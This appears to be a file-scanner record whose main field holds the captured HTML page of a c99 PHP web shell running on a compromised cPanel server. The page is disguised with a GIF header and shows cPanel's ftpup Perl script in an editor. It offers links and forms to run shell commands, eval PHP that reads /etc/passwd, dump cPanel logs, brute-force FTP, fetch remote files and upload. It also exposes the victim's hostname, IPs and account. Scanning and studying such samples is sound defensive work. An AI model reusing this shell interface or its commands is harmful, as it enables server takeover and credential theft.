{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "kill": "May delete a file",
            "mkdir": "May create a directory",
            "open": "May open a file",
            "system": "May run an executable file or a system command on a Mac",
            "windows": "May enumerate application windows"
        },
        "macro": "GIF89;a\n<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language\" content=\"en-us\"><title>c99 v0.0.1 SYN-MOD [SYNSTA] @www.charmainesinclairlive.co.uk</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0><center><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor=\"#C0C0C0\"><tr><th width=\"101%\" height=\"15\" nowrap bordercolor=\"#C0C0C0\" valign=\"top\" colspan=\"2\"><p><font face=Webdings size=6><b>!</b></font><a href=\"?\"><font face=\"Verdana\" size=\"5\"><b>c99 v0.0.1 SYN-MOD [SYNSTA]</b></font></a><font face=Webdings size=6><b>!</b></font></p></center></th></tr><tr><td><p align=\"left\"><b>Software:&nbsp;Apache. <a href=\"?act=phpinfo\" target=\"_blank\"><b><u>PHP/5.2.9</u></b></a></b>&nbsp;</p><p align=\"left\"><b>uname -a:&nbsp;Linux wc3.titleworkspace.com 2.6.18-194.32.1.el5 #1 SMP Wed Jan 5 17:53:09 EST 2011 i686</b>&nbsp;</p><b>Disabled functions</b> : <b><font color=green>NONE</font></b><p align=\"left\"><b>We are: uid=608(chsclair) gid=605(chsclair) groups=605(chsclair)<br>context=system_u:system_r:crond_t:s0-s0:c0.c1023<br/>cURL: <b><font color=green>ON</font><br/>MySQL: <b><font color=green>ON</font></b><br/>MSSQL: <b><font color=red>OFF</font><br/>PostgreSQL: <b><font color=red>OFF</font><br/>Oracle: <b><font color=red>OFF</font> </b>&nbsp;</p><p align=\"left\"><b>Safe-mode:&nbsp;<font color=green>OFF (not secure)</font></b></p><p align=\"left\"><a href=\"?act=ls&d=%2F&sort=0a\"><b>/</b></a><a href=\"?act=ls&d=%2Fscripts%2F&sort=0a\"><b>scripts/</b></a>&nbsp;&nbsp;&nbsp;<b><font color=white>drwxr-xr-x</font></b><br><b>Free 6.76 GB of 7.65 GB (88.4%)</b><br><b>Your ip: <a href=http://87.177.178.86>87.177.178.86</a> - Server ip: <a href=http://109.75.162.166>109.75.162.166</a></b><br/><a href=\"?\"><hr><b>[Home]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=search&d=%2Fscripts%2F\"><b>[Search]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=fsbuff&d=%2Fscripts%2F\"><b>[Buffer]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=encoder&d=%2Fscripts%2F\"><b>[Encoder]</b></b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=tools&d=%2Fscripts%2F\"><b>[Tools]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=processes&d=%2Fscripts%2F\"><b>[Processes]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=ftpquickbrute&d=%2Fscripts%2F\"><b>[FTP Brute Forcer]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=security&d=%2Fscripts%2F\"><b>[Server Security Information]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=sql&d=%2Fscripts%2F\"><b>[SQL Manager]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=eval&d=%2Fscripts%2F&eval=readfile('/etc/passwd');\"><b>[Eval PHP code]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=selfremove\"><b>[Self remove]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=cmd&cmd=cat+%2Fvar%2Fcpanel%2Faccounting.log&cmd_txt=1&submit=Execute\"><b>[Cpanel Logs]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;</p></td></tr></table><br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"100%\" valign=\"top\"><b>Viewing file:&nbsp;&nbsp;&nbsp;&nbsp;[ftpup]&nbsp;ftpup (13.24 KB) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=white>-rwxr-xr-x</font></b><br>Select action/file-type:<br> <a href=\"?act=f&f=ftpup&ft=info&d=%2Fscripts%2F\"><b>[hex]</b></a> (<a href=\"?act=f&f=ftpup&ft=info&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ftpup&ft=html&d=%2Fscripts%2F\"><b>[html]</b></a> (<a href=\"?act=f&f=ftpup&ft=html&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ftpup&ft=txt&d=%2Fscripts%2F\"><b>[txt]</b></a> (<a href=\"?act=f&f=ftpup&ft=txt&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ftpup&ft=code&d=%2Fscripts%2F\"><b>[Code]</b></a> (<a href=\"?act=f&f=ftpup&ft=code&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ftpup&ft=phpsess&d=%2Fscripts%2F\"><b>[Session]</b></a> (<a href=\"?act=f&f=ftpup&ft=phpsess&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ftpup&ft=exe&d=%2Fscripts%2F\"><b>[exe]</b></a> (<a href=\"?act=f&f=ftpup&ft=exe&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ftpup&ft=sdb&d=%2Fscripts%2F\"><b>[SDB]</b></a> (<a href=\"?act=f&f=ftpup&ft=sdb&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ftpup&ft=img&d=%2Fscripts%2F\"><b>[gif]</b></a> (<a href=\"?act=f&f=ftpup&ft=img&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ftpup&ft=ini&d=%2Fscripts%2F\"><b>[ini]</b></a> (<a href=\"?act=f&f=ftpup&ft=ini&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ftpup&ft=download&d=%2Fscripts%2F\"><b>[download]</b></a> (<a href=\"?act=f&f=ftpup&ft=download&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ftpup&ft=notepad&d=%2Fscripts%2F\"><b>[rtf]</b></a> (<a href=\"?act=f&f=ftpup&ft=notepad&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=ftpup&ft=edit&d=%2Fscripts%2F\"><b><u>[change]</u></b></a> (<a href=\"?act=f&f=ftpup&ft=edit&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) |<hr size=\"1\" noshade><form action=\"?act=f&f=ftpup&ft=edit&d=%2Fscripts%2F\" method=POST><input type=submit name=submit value=\"Save\">&nbsp;<input type=\"reset\" value=\"Reset\">&nbsp;<input type=\"button\" onclick=\"location.href='?act=ls&d=/scripts';\" value=\"Back\"><br><textarea name=\"edit_text\" cols=\"122\" rows=\"10\">#!/usr/bin/perl\n# cpanel - ftpup                                  Copyright(c) 2010 cPanel, Inc.\n#                                                           All rights Reserved.\n# copyright@cpanel.net                                         http://cpanel.net\n# This code is subject to the cPanel license. Unauthorized copying is prohibited\n\nBEGIN { unshift @INC, '/usr/local/cpanel', '/scripts'; }\n\nuse IPC::Open3                 ();\nuse Cpanel::OSSys              ();\nuse Cpanel::Sys                ();\nuse Cpanel::SysPkgs            ();\nuse Cpanel::Logger             ();\nuse Cpanel::Config::LoadCpConf ();\nuse Cpanel::FtpUtils::Config   ();\nuse Cpanel::RpmStor            ();\nuse Cpanel::HttpRequest        ();\nuse Cpanel::RpmUtils           ();\nuse Cpanel::Update             ();\nuse Cpanel::Proc               ();\nuse Cpanel::Sys::OS            ();\nuse Cpanel::Init               ();\nuse Cpanel::SSLCerts           ();\nuse cPpkgversions              ();\nuse Fcntl                      ();\nuse RestartSrv;\n\nCpanel::Update::safe_update_environment('ftp');\nCpanel::Update::init_UP_update('ftp');\n\nmy $logger = Cpanel::Logger-&gt;new();\n\nmy ( $system, $release, $machine ) = ( Cpanel::OSSys::uname() )[ 0, 2, 4 ];\nmy $httpClient = Cpanel::HttpRequest-&gt;new( 'hideOutput' =&gt; 0 );\nmy $hostname   = Cpanel::Sys::gethostname();\nmy $cpconf_ref = Cpanel::Config::LoadCpConf::loadcpconf();\nmy $pkg        = $cpconf_ref-&gt;{'ftpserver'} || 'pure-ftpd';\nmy $kill       = $pkg eq 'pure-ftpd' ? 'proftpd' : 'pure-ftpd';\nmy $now        = time;\nmy $latest     = 0;\nmy $src        = 0;\nmy $force      = 0;\nif (@ARGV) {\n    if ( grep( /force/,  @ARGV ) ) { $force  = 1; }\n    if ( grep( /source/, @ARGV ) ) { $src    = 1; }\n    if ( grep( /latest/, @ARGV ) ) { $latest = 1; }\n    if ( grep( /\\Q$kill\\E/, @ARGV ) ) {\n        print &quot;/scripts/ftpup does not support arguments to change the configured FTP server.\\n&quot;;\n        print &quot;Use \\&quot;/scripts/setupftpserver $kill\\&quot; instead.\\n&quot;;\n        exit 1;\n    }\n}\n\nunless ( $pkg eq 'pure-ftpd' || $pkg eq 'proftpd' ) {\n    die &quot;Unknown FTP server: $pkg&quot;;\n}\n\nprint &quot;Ftp Setup Script Version 6.1\\n&quot;;\n\n$ENV{'PATH'} = $ENV{'PATH'} . ':/usr/sbin';\n\nmy $syspkgobj = Cpanel::SysPkgs-&gt;new();\nif ( !$syspkgobj ) {\n    die print &quot;Could not create SysPkgs object\\n&quot;;\n}\n\nmy @pkgs = ($pkg);\n\nif ( $system =~ /freebsd/i ) {\n    system(&quot;/scripts/checkmakeconf&quot;);\n    system(&quot;/scripts/portsup&quot;);\n    my $result;\n\n    print &quot;This is the $pkg installer\\n&quot;;\n\n    my (@CMD);\n    if ($force) {\n        @CMD = ( '/scripts/installpkg', '--force', $pkg );\n    }\n    else {\n        @CMD = ( '/scripts/installpkg', '--keepnew', $pkg );\n    }\n\n    open( RNULL, '&lt;', '/dev/null' );\n    IPC::Open3::open3( '&lt;&amp;RNULL', \\*OP, '&gt;&amp;STDERR', @CMD );\n    while (&lt;OP&gt;) {\n        $result .= $_;\n    }\n    close(RNULL);\n\n    if ( $pkg eq 'proftpd' ) {\n        if ( -e &quot;/etc/proftpd&quot; ) {\n            chmod( 0751, &quot;/etc/proftpd&quot; );\n        }\n        else {\n            mkdir( '/etc/proftpd', 0751 );\n        }\n    }\n    else {\n\n        # Replacement for installcpbsdpkg pure-ftpd\n\n        # Install pureauth\n        my $pureauth     = '/usr/local/sbin/pureauth';\n        my $pureauth_src = '/usr/local/cpanel/bin/pureauth';\n\n        unless ( -e $pureauth &amp;&amp; ( stat($pureauth) )[7] == ( stat($pureauth_src) )[7] &amp;&amp; ( stat($pureauth) )[9] &gt;= ( stat($pureauth_src) )[9] ) {\n            print &quot;Updating pureauth.\\n&quot;;\n            system( 'cp', '-fv', $pureauth_src, $pureauth );\n            chmod( 0700, $pureauth );\n        }\n\n        # Install pureauth init script\n        print &quot;Updating purauth init script.\\n&quot;;\n        my $init = Cpanel::Init-&gt;new() || $logger-&gt;die('Could not create Init object');\n        $init-&gt;run_command_for_one( 'install', 'pure-authd' );\n    }\n\n    # Check SSL cert\n    print &quot;Checking SSL certs...&quot;;\n    my $valid_certs = 1;\n  CERT_CHECK:\n    foreach my $dir ( '/etc/', '/etc/ssl/private/' ) {\n        foreach my $file ( 'pure-ftpd.pem', 'ftpd-rsa-key.pem', 'ftpd-rsa.pem' ) {\n            unless ( -e $dir . $file ) {\n                $valid_certs = 0;\n                last CERT_CHECK;\n            }\n        }\n    }\n    if ($valid_certs) {\n        print &quot;done\\n&quot;;\n    }\n    else {\n        print &quot;missing\\n&quot;;\n        print &quot;Generating default certs...&quot;;\n        open OLDSTDERR, '&gt;&amp;STDERR';\n        open STDERR, '&gt;', '/dev/null';\n        Cpanel::SSLCerts::createDefaultSSLFiles( 'service' =&gt; 'ftp' );\n        open STDERR, '&gt;&amp;OLDSTDERR';\n        print &quot;done\\n&quot;;\n    }\n\n    if ( !$force &amp;&amp; $result !~ /reinstall/im &amp;&amp; ( $result =~ /(^|(?&lt;!Checking if)\\s)\\s*\\S*${pkg}.*\\salready\\s+installed/m || $result =~ /${pkg}.*\\sis\\s+installed/m || $result =~ /${pkg}.*\\sis\\s+newer/m ) ) {\n        print $result;\n        check_proftpd_conf();\n        exit();\n    }\n\n    Cpanel::Proc::doom($kill);\n    print &quot;Removing old ftp server ($kill)\\n&quot;;\n    system( &quot;pkg_delete&quot;, &quot;-x&quot;, $kill );\n    resetbsdpkgcache();\n\n    setupftpconf();\n    resftp();\n    exit;\n}\n\nmy $arch = 'i386';\n\nif ( -e &quot;/etc/trustix-release&quot; ) {\n    $distro = 'trustix';\n    ($version) = Cpanel::Sys::OS::getversionfromfile('/etc/trustix-release');\n    $arch = 'i586';\n}\nelsif ( -e &quot;/etc/caos-release&quot; ) {\n    $distro = 'caos';\n    ($version) = Cpanel::Sys::OS::getversionfromfile('/etc/caos-release');\n}\nelsif ( -e &quot;/etc/SuSE-release&quot; ) {\n    $distro = 'suse';\n    ($version) = Cpanel::Sys::OS::getversionfromfile('/etc/SuSE-release');\n    if ( $version &gt;= 9 ) { $arch = 'i586'; }\n}\nelsif ( -e &quot;/etc/fedora-release&quot; ) {\n    $distro = 'fedora';\n    ($version) = Cpanel::Sys::OS::getversionfromfile('/etc/fedora-release');\n}\nelsif ( -e &quot;/etc/mandrake-release&quot; ) {\n    $distro = 'mandrake';\n    ($version) = Cpanel::Sys::OS::getversionfromfile('/etc/mandrake-release');\n    $arch = 'i586';\n}\nelsif ( -e &quot;/etc/whitebox-release&quot; ) {\n    $distro = 'whitebox';\n    ($version) = Cpanel::Sys::OS::getversionfromfile('/etc/whitebox-release');\n}\nelsif ( -e &quot;/etc/redhat-release&quot; ) {\n    $distro = 'redhat';\n    ( $version, $ises ) = Cpanel::Sys::OS::getversionfromfile('/etc/redhat-release');\n}\n\nif ( $ises == 1 ) {\n    $version = &quot;AS-${version}&quot;;\n}\nif ( $ises == 2 ) {\n    $distro = &quot;centos&quot;;\n}\nif ( $ises == 3 ) {\n    $distro = &quot;whitebox&quot;;\n}\n\nmy $xdir = '';\n\nif ( $machine =~ /64/ ) {\n    $arch = 'x86_64';\n    $xdir .= &quot;/64&quot;;\n}\n\nmy $basedir = $pkg;\n\nmy ( $buildnum, $eximver, $bsv );\n\nmy %VINFO = cPpkgversions::getpkgversioninfo('ftp');\n\nif ( $pkg eq &quot;proftpd&quot; ) {\n    $buildnum = $VINFO{'proftpd'}{'release'};\n    $ftpver   = $VINFO{'proftpd'}{'version'};\n    $bsv      = $VINFO{'proftpd'}{'flags'};\n}\nelsif ( $pkg eq &quot;pure-ftpd&quot; ) {\n    $buildnum = $VINFO{'pure-ftpd'}{'release'};\n    $ftpver   = $VINFO{'pure-ftpd'}{'version'};\n    $bsv      = $VINFO{'pure-ftpd'}{'flags'};\n}\nif ( $bsv ne &quot;&quot; ) { $bsv = &quot;_&quot; . $bsv; }\n\nmy $cver = `rpm -q $pkg 2&gt;/dev/null`;\nchomp($cver);\n\nif ( -e &quot;/etc/proftpd&quot; ) { chmod( 0751, &quot;/etc/proftpd&quot; ); }\nelse                     { mkdir( '/etc/proftpd', 0751 ); }\n\nprint &quot;This is the $pkg $ftpver installer release number ${buildnum} for platform ${distro} ${version}\\n&quot;;\nif ( $cver eq &quot;${pkg}-${ftpver}-${buildnum}${bsv}&quot; &amp;&amp; !$force ) {\n    print &quot;${pkg} is up to date.  Use ftpup --force to force a reinstall\\n&quot;;\n    check_proftpd_conf();\n    exit();\n}\n\nif ( -x '/scripts/preftpup' ) {\n    system '/scripts/preftpup';\n}\n\nif ( -e '/home/ftpup-install' ) {\n    system 'rm', '-rf', '/home/ftpup-install';\n}\nmkdir '/home/ftpup-install', 0700;\nchdir '/home/ftpup-install';\n\n@pkgs = qw( libdb3.3-devel db4-devel pam-devel openssl openssl-devel gcc glibc-devel compat-db zlib-devel rpm-build tcp_wrap tcpd tcp_wrap-devel tcpd-devel );\n$syspkgobj-&gt;install( 'pkglist' =&gt; \\@pkgs );\n\nsystem(&quot;/scripts/checklibssl&quot;);\n\nprint &quot;Resetting $pkg to cPanel Defaults and Installing the Latest Version\\n&quot;;\n\nmy $url  = &quot;http://diff.cpanel.net/ftpinstall/${basedir}/${xdir}/${distro}/${version}/${pkg}-${ftpver}-${buildnum}${bsv}.${arch}.rpm&quot;;\nmy @SLA  = split( /\\//, $url );\nmy $file = $SLA[$#SLA];\n\ndie &quot;File $file is not valid&quot; if ( $file eq &quot;&quot; );\n\nif ( !$src ) {\n    $httpClient-&gt;download( $url, $file );\n\n    if ( ( stat(&quot;$file&quot;) )[7] &lt;= 0 ) {\n        print &quot;Failed to download $url .. using source instead\\n&quot;;\n        $latest = 1;\n        $src    = 1;\n    }\n}\n\nif ($src) {\n    $file = buildrpm();\n    if ( !$file ) {\n        die &quot;Rpm failed to build!&quot;;\n    }\n}\n\nif ( ( stat(&quot;$file&quot;) )[7] &lt;= 0 ) {\n    die &quot;Failed to download/build $url&quot;;\n}\n\nif ( !Cpanel::RpmUtils::checkrpm($file) ) {\n    die &quot;${file} is not a valid rpm file&quot;;\n}\n\nif ( $pkg eq &quot;proftpd&quot; ) {\n    Cpanel::Proc::doom(&quot;pure-ftpd&quot;);\n    nooutputsystem( &quot;rpm&quot;, &quot;-e&quot;, &quot;pure-ftpd&quot; );\n}\nelse {\n    Cpanel::Proc::doom(&quot;proftpd&quot;);\n    nooutputsystem( &quot;rpm&quot;, &quot;-e&quot;, &quot;proftpd&quot; );\n}\n\n$ENV{'RPMINSTALL'} = 1;\nCpanel::RpmUtils::rpmpreinstall($file);\n\nmy @ftp_cert_files = qw( /etc/ftpd-rsa.pem /etc/ftpd-rsa-key.pem /etc/ftpd-dhparam.pem /etc/ftpd-dsa-key.pem /etc/ftpd-dsa.pem /etc/ssl/private/pure-ftpd.pem );\nforeach my $cert_file (@ftp_cert_files) {\n\n    # Remove any lingering &quot;preinstall&quot; certs\n    if ( -e $cert_file . '.preinstall' ) {\n        unlink $cert_file . '.preinstall';\n    }\n\n    # Rename existing certs\n    if ( -e $cert_file ) {\n        rename $cert_file, $cert_file . '.preinstall';\n    }\n}\n\n# Install new RPM\nsystem 'rpm', '-Uvh', '--nodeps', '--force', $file;\n\n# Restore certs\nforeach my $cert_file (@ftp_cert_files) {\n    if ( -e $cert_file . '.preinstall' ) {\n        rename $cert_file . '.preinstall', $cert_file;\n    }\n}\n\nif ( $pkg ne 'proftpd' ) {\n    if ( !-e '/usr/local/cpanel/bin/pureauth' ) {\n        warn '/usr/local/cpanel/bin/pureauth IS MISSING';\n    }\n    system( 'cp', '-fv', '/usr/local/cpanel/bin/pureauth', '/usr/sbin/pureauth' );\n    system( 'cp', '-fv', '/usr/local/cpanel/bin/pureauth', '/usr/local/sbin/pureauth' );\n    chmod( 0700, '/usr/sbin/pureauth' );\n    chmod( 0700, '/usr/local/sbin/pureauth' );\n}\n\n$ENV{'RPMINSTALL'} = 0;\nchdir '/';\nsystem 'rm', '-rf', '/home/ftpup-install';\n\nif ( !-d '/etc/proftpd' ) {\n    if ( -e '/etc/proftpd' ) {\n        rename '/etc/proftpd', '/etc/proftpd.ftpup.back';\n    }\n    mkdir '/etc/proftpd', 0751;\n}\nelse {\n    chmod 0751, '/etc/proftpd';\n}\n\nif ( -x '/scripts/postftpup' ) {\n    system '/scripts/postftpup';\n}\n\nif ( -x '/scripts/postftpinstall' ) {\n    system '/scripts/postftpinstall';\n}\n\nsetupftpconf();\n\nresftp();\n\nprint &quot;Install Complete\\n&quot;;\n\nsub buildrpm {\n    my $syspkgobj = Cpanel::SysPkgs-&gt;new();\n    if ( !$syspkgobj ) {\n        die &quot;Unable to create system package object. Fatal error.&quot;;\n    }\n    my @pkgs = ( &quot;rpm&quot;, &quot;rpm-build&quot;, &quot;db-devel&quot;, &quot;gdbm-devel&quot;, &quot;db1-devel&quot;, &quot;compat-db&quot;, &quot;ndbm-devel&quot; );\n    $syspkgobj-&gt;install( 'pkglist' =&gt; \\@pkgs );\n\n    my $rpm = 'rpm';\n    if ( -e &quot;/usr/bin/rpmbuild&quot; ) { $rpm = '/usr/bin/rpmbuild'; }\n\n    $url = &quot;http://diff.cpanel.net/ftpinstall/${basedir}/src/${pkg}-${ftpver}-${buildnum}${bsv}.src.rpm&quot;;\n\n    $httpClient-&gt;download( $url, &quot;${pkg}.src.rpm&quot; );\n\n    open( RNULL, &quot;&lt;&quot;, &quot;/dev/null&quot; );\n    print &quot;Building RPM...&quot;;\n    open( RPM, &quot;&gt;&quot;, &quot;rpmbuildlog&quot; );\n    $pid = IPC::Open3::open3( &quot;&lt;&amp;RNULL&quot;, &quot;&gt;&amp;RPM&quot;, &quot;&gt;&amp;RPM&quot;, &quot;$rpm&quot;, &quot;--rebuild&quot;, &quot;${pkg}.src.rpm&quot; );\n    while ( waitpid( $pid, 1 ) &lt;= 0 ) {\n        print &quot;.&quot;;\n        sleep(1);\n    }\n    close(RPM);\n    close(RNULL);\n    print &quot;Done\\n&quot;;\n\n    open( RPM, &quot;&lt;&quot;, &quot;rpmbuildlog&quot; );\n    while (&lt;RPM&gt;) {\n        if (/^Wrote: (\\S+)/) {\n            $file = $1;\n            if ( $file =~ /.(64|86)\\.rpm/ ) {\n                Cpanel::RpmStor::rpmstor($file);\n\n                return ($file);\n            }\n        }\n    }\n    close(RPM);\n\n    open( RPM, &quot;&lt;&quot;, &quot;rpmbuildlog&quot; );\n    seek( RPM, -2048, &amp;Fcntl::SEEK_END );\n    while (&lt;RPM&gt;) {\n        print &quot;\\t&quot; . $_;\n    }\n    close(RPM);\n\n    die &quot;Failed to build rpm&quot;;\n\n}\n\nsub setupftpconf {\n    if (   ( -f &quot;/var/log/xferlog&quot; || !-e &quot;/var/log/xferlog&quot; )\n        &amp;&amp; !-l &quot;/var/log/xferlog&quot;\n        &amp;&amp; -e &quot;/usr/local/apache/domlogs/ftpxferlog&quot; ) {\n        open( OLDX, &quot;&lt;&quot;,  &quot;/var/log/xferlog&quot; );\n        open( NEWX, &quot;&gt;&gt;&quot;, &quot;/usr/local/apache/domlogs/ftpxferlog&quot; );\n        while (&lt;OLDX&gt;) {\n            print NEWX;\n        }\n        close(OLDX);\n        close(NEWX);\n        unlink(&quot;/var/log/xferlog&quot;);\n        symlink( &quot;../../usr/local/apache/domlogs/ftpxferlog&quot;, &quot;/var/log/xferlog&quot; );\n        print &quot;Ftp Log Relocated!\\n&quot;;\n    }\n\n    if ( $pkg eq &quot;proftpd&quot; ) {\n        my $conf = '/etc/proftpd.conf';\n        if ( $system =~ /freebsd/i ) {\n            $conf = '/usr/local/etc/proftpd.conf';\n        }\n        system(&quot;/scripts/fixproftpdconf&quot;);\n        system(&quot;/usr/local/cpanel/bin/proftpdvhosts&quot;);\n        system(&quot;/scripts/rebuildproftpd &gt;&gt; $conf&quot;);\n        system(&quot;/usr/local/cpanel/bin/proftpdtls&quot;);\n    }\n\n    my $conf_obj = Cpanel::FtpUtils::Config-&gt;new();\n    my $conf_hr  = $conf_obj-&gt;get_config(1);\n    $conf_obj-&gt;save_datastore($conf_hr);\n    $conf_obj-&gt;update_config($conf_hr);\n}\n\nsub resftp {\n    system( &quot;/scripts/restartsrv&quot;, $pkg );\n}\n\nsub resetbsdpkgcache {\n    my ( undef, undef, undef, $mday, $mon, $year, undef, undef, undef ) = localtime($now);\n    $year += 1900;\n    $mon++;\n    unlink(&quot;/root/.cpbsdpkgs/${mon}-${mday}-${year}.PKGDATE&quot;);\n    unlink(&quot;/root/.cpbsdpkgs/${mon}-${mday}-${year}.PKGINFO&quot;);\n    unlink('/root/.cpbsdpkgs/pkg_version');\n}\n\n# One time fixup?\nsub check_proftpd_conf {\n    if ( $pkg eq &quot;proftpd&quot; ) {\n        my $conf = '/etc/proftpd.conf';\n        if ( $system =~ /freebsd/i ) {\n            $conf = '/usr/local/etc/proftpd.conf';\n        }\n        my $size = ( stat($conf) )[7];\n        if ( $size &lt; 30 ) {\n            setupftpconf();\n            resftp();\n        }\n    }\n}\n\n</textarea></form>\n</td></tr></table><a bookmark=\"minipanel\"><br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>\n<tr><td width=\"100%\" height=\"1\" valign=\"top\"><center><form action=\"?\"><input type=hidden name=act value=\"cmd\"><br/><b>CMD:</b> <input type=hidden name=\"d\" value=\"/scripts/\"><input type=\"text\" name=\"cmd\" size=\"50\" value=\"\"><input type=hidden name=\"cmd_txt\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Execute\"></form></td></tr></TABLE>\n<br>\n<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>\n<tr>\n <td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: <a href=\"?act=search&d=%2Fscripts%2F\"><b>Search</b></a> ::</b><form method=\"POST\"><input type=hidden name=act value=\"search\"><input type=hidden name=\"d\" value=\"/scripts/\"><input type=\"text\" name=\"search_name\" size=\"29\" value=\"(.*)\">&nbsp;<input type=\"checkbox\" name=\"search_name_regexp\" value=\"1\"  checked> - regexp&nbsp;<input type=submit name=submit value=\"Search\"></form></center></p></td>\n <td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: <a href=\"?act=upload&d=%2Fscripts%2F\"><b>Upload</b></a> ::</b><form method=\"POST\" ENCTYPE=\"multipart/form-data\"><input type=hidden name=act value=\"upload\"><input type=\"file\" name=\"uploadfile\"><input type=hidden name=\"miniform\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Upload\"><br><font color=red>[ Read-Only ]</font></form></center></td>\n</tr>\n</table>\n\n\n<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Remote File Grabber ::</b><br/><br/><form action=\"?grab=true\"   method=\"post\">File Url:<input name=\"from\"> New File Name: <input name=\"to\"> <input type=\"submit\" value=\"Grab!\"></center></td></tr></table>\n<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Make Dir ::<p><form action=\"?\"><input type=hidden name=act value=\"mkdir\"><input type=hidden name=\"d\" 